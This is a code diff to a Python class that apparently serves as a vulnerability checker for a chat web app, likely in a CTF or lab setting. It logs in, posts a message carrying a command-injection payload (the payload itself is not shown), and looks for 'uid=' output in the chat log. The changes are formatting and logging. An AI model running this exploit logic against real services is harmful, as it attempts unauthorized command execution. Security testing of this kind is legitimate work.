@@ -7,12 +7,12 @@ from bs4 import BeautifulSoup
 from time import sleep, time
 
 import logging
+
 log = logging.getLogger(__name__)
 
 
 class Chat:
     def __init__(self):
-        log.info("[*] Chat exploit initialized")
         self.__host = None
         self.__port = 80
         self.__post = "/chat/post.php"
@@ -23,49 +23,54 @@ class Chat:
         self.__requests = requests.session()
 
     def __cookie(self):
-        log.debug("[!] Retrieving Cookie")
+        log.debug(f"[!] Retrieving Cookie ({self.__host})")
         r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__enter}")
         if r.status_code != 200:
             return False
         return True
 
     def __login(self):
-        log.debug("[!] Logging in")
-        params = {
-            "name": self.__name,
-            "enter": "Enter"
-        }
-        r = self.__requests.post(f"http://{self.__host}:{self.__port}{self.__enter}", data=params)
+        log.debug(f"[!] Logging in ({self.__host})")
+        params = {"name": self.__name, "enter": "Enter"}
+        r = self.__requests.post(
+            f"http://{self.__host}:{self.__port}{self.__enter}", data=params
+        )
         if r.status_code != 200:
             return False
         return True
 
     def __read(self):
-        log.debug("[!] Retreiving data")
+        log.debug(f"[!] Retreiving data ({self.__host})")
         r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__logs}")
         if "Papa Smurf" not in r.text:
             return False
         return True
 
     def __check(self):
-        log.debug("Checking service status")
+        log.debug(f"[!] Checking service status ({self.__host})")
         data = {"_": time()}
-        r = self.__requests.get(f"http://{self.__host}:{self.__port}{self.__logs}", params=data)
-        msgs = BeautifulSoup(r.text, 'lxml').find_all('div')
+        r = self.__requests.get(
+            f"http://{self.__host}:{self.__port}{self.__logs}", params=data
+        )
+        msgs = BeautifulSoup(r.text, "lxml").find_all("div")
         # Loop last 10 messsages
         if len(msgs) < 5:
             return True
         for i in msgs[-9:]:
             if "uid=" in i.text:
-                log.info("[!] Target is vulnerable")
+                log.info(f"[!] Target is vulnerable ({self.__host})")
                 return True
-        log.info("[!] Target not vulnerable")
+        log.info(f"[!] Target not vulnerable ({self.__host})")
         return False
 
     def __exploit(self):
-        log.debug("[!] In __exploit")
+        log.debug(f"[!] Sending Chat App exploit ({self.__host})")
         whoami = {"text": f"do you know {self.__payload}"}
-        r = requests.post(f"http://{self.__host}:{self.__port}{self.__post}", data=whoami, cookies=self.__requests.cookies)
+        r = requests.post(
+            f"http://{self.__host}:{self.__port}{self.__post}",
+            data=whoami,
+            cookies=self.__requests.cookies,
+        )
         if r.status_code != 200:
             return True
         sleep(5)
@@ -77,13 +82,17 @@ class Chat:
         if port:
             self.__port = port
         if not self.__cookie():
-            log.info("[!] Error in receiving cookie, reporting vulnerable")
+            log.info(
+                f"[!] Error in receiving cookie, reporting vulnerable ({self.__host})"
+            )
             return True
         if not self.__login():
-            log.info("[!] Error in logging in, reporting vulnerable")
+            log.info(f"[!] Error in logging in, reporting vulnerable ({self.__host})")
             return True
         if not self.__read():
-            log.info("[!] Error in getting page data, reporting vulnerable")
+            log.info(
+                f"[!] Error in getting page data, reporting vulnerable ({self.__host})"
+            )
             return True
         return self.__exploit()
 
